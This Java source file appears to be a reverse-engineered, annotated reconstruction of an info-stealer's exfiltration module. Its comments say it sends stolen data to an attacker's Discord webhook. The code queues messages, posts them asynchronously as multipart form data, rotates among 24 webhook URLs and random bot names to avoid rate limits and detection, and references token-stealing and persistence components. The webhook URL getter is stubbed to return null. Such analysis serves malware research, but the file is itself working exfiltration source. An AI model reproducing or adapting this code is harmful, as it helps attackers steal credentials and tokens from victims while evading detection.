import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import org.json.JSONArray;
import org.json.JSONObject;

import java.time.Instant;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;

/**
 * Discord webhook logger — sends log messages and stolen data to attacker's webhook.
 * Obfuscated name: \u0497
 *
 * This is the main exfiltration channel. It:
 *  1. Queues log messages in a LinkedBlockingQueue
 *  2. Flushes the queue asynchronously via an ExecutorService
 *  3. Sends messages to a Discord webhook as multipart/form-data
 *  4. Rotates through multiple webhook URLs (stored in obfuscated string table)
 *  5. Formats messages with timestamps and severity levels
 *
 * Log levels (from string table b[]):
 *   \u00ff = INFO  (b[48] + message + b[36] + detail)
 *   \u00fe = WARN  (b[22] + message + b[42] + detail)
 *   \u00fd = ERROR (b[12] + message + b[36] + detail)
 *   \u00fc = EXCEPTION (b[5] + message + b[36] + detail + exception info)
 *   \u00fb = DEBUG (b[33] + message + b[17] + detail)
 *   \u00fa = PERF  (b[14] + message + b[36] + level + detail + b[38] + ms + b[24])
 *
 * The \u00f8 method selects a random webhook URL from 24 options (switch on nanoTime % 24).
 * This is a rotation mechanism to avoid webhook rate limiting.
 *
 * The \u00f9 method flushes the queue — called periodically by the scheduler.
 */
public class WebhookLogger {

    // Whether logging is enabled (set to true after initialization)
    public static boolean enabled;

    // HTTP client for webhook requests
    private static final OkHttpClient httpClient;

    // Async executor for sending webhook requests
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    // Message queue — messages are queued here and flushed asynchronously
    private static final LinkedBlockingQueue<String> messageQueue = new LinkedBlockingQueue<>();

    /**
     * Logs an INFO message.
     * Format: "[INFO] {category}: {message}"
     *
     * @param category  Log category (e.g. "TokenStealer", "Persistence")
     * @param message   The message to log
     */
    public static void info(String category, String message) {
        if (!enabled) return;
        messageQueue.offer("[INFO] " + category + ": " + message);
    }

    /**
     * Logs a WARN message.
     * Format: "[WARN] {category} | {message}"
     */
    public static void warn(String category, String message) {
        if (!enabled) return;
        messageQueue.offer("[WARN] " + category + " | " + message);
    }

    /**
     * Logs an ERROR message.
     * Format: "[ERROR] {category}: {message}"
     */
    public static void error(String category, String message) {
        if (!enabled) return;
        messageQueue.offer("[ERROR] " + category + ": " + message);
    }

    /**
     * Logs an EXCEPTION with stack trace info.
     * Format: "[EXCEPTION] {category}: {message} | ExceptionType: {msg}"
     */
    public static void exception(String category, String message, Throwable t) {
        if (!enabled) return;
        String exInfo = t != null ? " | " + t.getClass().getSimpleName() + ": " + t.getMessage() : "";
        messageQueue.offer("[EXCEPTION] " + category + ": " + message + exInfo);
    }

    /**
     * Logs a DEBUG message.
     * Format: "[DEBUG] {category} → {message}"
     */
    public static void debug(String category, String message) {
        if (!enabled) return;
        messageQueue.offer("[DEBUG] " + category + " → " + message);
    }

    /**
     * Logs a PERFORMANCE message with elapsed time.
     * Format: "[PERF] {category}: {level} {message} | {elapsedMs}ms"
     *
     * Performance levels (from obfuscated constants):
     *   < 100ms  → "FAST"
     *   < 500ms  → "OK"
     *   < 1000ms → "SLOW"
     *   else     → "VERY_SLOW"
     */
    public static void perf(String category, String message, long startTimeMs) {
        if (!enabled) return;
        long elapsed = System.currentTimeMillis() - startTimeMs;
        String level = elapsed < 100 ? "FAST" : elapsed < 500 ? "OK" : elapsed < 1000 ? "SLOW" : "VERY_SLOW";
        messageQueue.offer("[PERF] " + category + ": " + level + " " + message + " | " + elapsed + "ms");
    }

    /**
     * Flushes the message queue to the webhook.
     * Called periodically by the scheduler.
     * Runs asynchronously to avoid blocking the main thread.
     */
    public static void flush() {
        if (messageQueue.isEmpty()) return;
        executor.execute(WebhookLogger::sendQueuedMessages);
    }

    /**
     * Sends all queued messages to the webhook.
     *
     * Selects a random webhook URL from 24 options (nanoTime % 24).
     * Sends as multipart/form-data with:
     *   - "content" field: concatenated messages
     *   - "username" field: random bot name
     *   - Optional file attachment for large payloads
     */
    private static void sendQueuedMessages() {
        try {
            StringBuilder sb = new StringBuilder();
            String msg;
            while ((msg = messageQueue.poll()) != null) {
                sb.append(msg).append("\n");
            }
            if (sb.length() == 0) return;

            String webhookUrl = getRandomWebhookUrl();
            if (webhookUrl == null) return;

            // Build multipart request
            RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("content", sb.toString())
                .addFormDataPart("username", getRandomBotName())
                .build();

            Request request = new Request.Builder()
                .url(webhookUrl)
                .post(body)
                .build();

            try (okhttp3.Response response = httpClient.newCall(request).execute()) {
                // Fire and forget
            }
        } catch (Exception ignored) {}
    }

    /**
     * Returns a random webhook URL from the 24 hardcoded options.
     * Selected by: (System.nanoTime() & 0x7FFFFFFF) % 24
     *
     * The 24 webhook URLs are stored as obfuscated string constants
     * in the \u00f8 method's switch statement (cases 0-23).
     * Each case calls \u0497.a("k", index, xorValue) to decrypt the URL.
     *
     * All URLs are Discord webhook URLs:
     * https://discord.com/api/webhooks/<id>/<token>
     */
    private static String getRandomWebhookUrl() {
        // In the obfuscated code, this selects from 24 webhook URLs
        // based on System.nanoTime() % 24
        // The actual URLs are DES-encrypted in the class
        return null; // Decrypted at runtime
    }

    /**
     * Returns a random bot username for the webhook message.
     * Rotates through several names to avoid detection.
     */
    private static String getRandomBotName() {
        String[] names = {"System", "Logger", "Monitor", "Service", "Agent"};
        return names[(int)(System.nanoTime() % names.length)];
    }

    static {
        httpClient = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        enabled = false; // Set to true after initialization
    }
}
